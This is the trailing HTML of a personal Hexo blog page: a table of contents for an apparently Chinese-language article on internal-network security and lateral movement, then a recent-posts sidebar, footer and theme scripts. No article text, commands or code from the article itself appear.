href="#%E5%86%85%E7%BD%91-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">内网|基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91-%E5%88%9D%E5%AD%A6-%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">内网|初学|具体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、基本信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">二、网络信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">三、用户信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%87%AD%E6%8D%AE%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">四、凭据信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%8E%A2%E9%92%88%E4%B8%BB%E6%9C%BA%E5%9F%9F%E6%8E%A7%E6%9E%B6%E6%9E%84%E6%9C%8D%E5%8A%A1"><span class="toc-text">五、探针主机域控架构服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nishang%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">nishang使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%8E%A2%E9%92%88%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E8%A7%92%E8%89%B2%E5%8F%8A%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-text">六、探针域内主机角色及服务信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">内网安全|横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">横向渗透|域环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83-%E4%BC%A0%E9%80%92"><span class="toc-text">域环境|传递</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-at-schtasks"><span class="toc-text">传递|at&amp;schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-at"><span class="toc-text">传递|at</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-schtasks"><span class="toc-text">传递|schtasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B7%A5%E5%85%B7%E5%8C%85-impacket"><span class="toc-text">网络协议工具包|impacket</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%B8%8A%E8%BF%B0%E4%BC%A0%E9%80%92%E6%B8%97%E9%80%8F%E7%9A%84%E7%BB%BC%E5%90%88%E8%BF%9B%E9%98%B6%E6%80%9D%E8%B7%AF"><span class="toc-text">基于上述传递渗透的综合进阶思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-smb-wmi"><span class="toc-text">传递|smb|wmi</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-SMB"><span class="toc-text">传递|SMB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-WMI"><span class="toc-text">传递|WMI</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%B8%8A%E8%BF%B0%E4%BC%A0%E9%80%92%E6%B8%97%E9%80%8F%E7%9A%84%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">基于上述传递渗透的综合利用思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93"><span class="toc-text">传递|阶段总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-PTH-PTK-PTT"><span class="toc-text">传递|PTH|PTK|PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-PTH"><span class="toc-text">传递|PTH</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-PTK"><span class="toc-text">传递|PTK</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-PTT"><span class="toc-text">传递|PTT</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92-RDP"><span class="toc-text">传递|RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RDP%E5%8D%8F%E8%AE%AE"><span class="toc-text">RDP协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83-SPN"><span class="toc-text">域环境|SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SPN%E6%89%AB%E6%8F%8F"><span class="toc-text">SPN扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ESPN%E6%89%AB%E6%8F%8F%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">基于SPN扫描的攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E7%A9%BF%E9%80%8F"><span class="toc-text">横向渗透|穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BF%E9%80%8F-%E4%BB%A3%E7%90%86"><span class="toc-text">穿透|代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">代理|基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86-%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">代理|具体分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86-%E4%B8%80%E9%81%93ctf%E5%A4%BA%E6%97%97"><span class="toc-text">代理|一道ctf夺旗</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BF%E9%80%8F-%E9%9A%A7%E9%81%93"><span class="toc-text">穿透|隧道</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lynn's Tasks"/></a><div class="content"><a class="title" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks">Lynn's Tasks</a><time datetime="2023-12-14T03:43:49.000Z" title="发表于 2023-12-14 11:43:49">2023-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web安全（目前）绕过|姿势总结"/></a><div class="content"><a class="title" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结">Web安全（目前）绕过|姿势总结</a><time datetime="2023-12-13T12:47:55.000Z" title="发表于 2023-12-13 20:47:55">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/phpWeiXieYi/" title="php伪协议"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2023/12/13/phpWeiXieYi/" title="php伪协议">php伪协议</a><time datetime="2023-12-13T03:24:58.000Z" title="发表于 2023-12-13 11:24:58">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/05/neiwangSecury/" title="内网安全"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2023/12/05/neiwangSecury/" title="内网安全">内网安全</a><time datetime="2023-12-05T13:51:20.000Z" title="发表于 2023-12-05 21:51:20">2023-12-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/ctfshow/" title="ctfshow|Recording"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow|Recording"/></a><div class="content"><a class="title" href="/2023/12/02/ctfshow/" title="ctfshow|Recording">ctfshow|Recording</a><time datetime="2023-12-02T14:41:06.000Z" title="发表于 2023-12-02 22:41:06">2023-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>成功的花，人们只惊羡她现时的明艳，然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。成功不是一时的,而是以日夜的奋斗拼搏出来的。锲而舍之，朽木不折；锲而不舍，金石可镂。朋友们，一起去探索那浩瀚的星辰吧✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div></div></div><div class="ft-item-2"><p class="ft-t">猜你想看💡<ul class="ft-links"><li><a href="/personal/about/">关于作者</a></li><li><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a></li><li><a href="/tags/">文章标签</a></li></ul></p></div></div><div class="copyright"><span><b>&copy;2023</b></span><span><b>&nbsp;&nbsp;By DralinF</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script src="/js/jquery.js"></script><script src="/js/sakura.js"></script><script src="/js/foot.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script defer src="/js/runtime.js"></script><script async src="/js/title.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '113.34532,23.15624';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>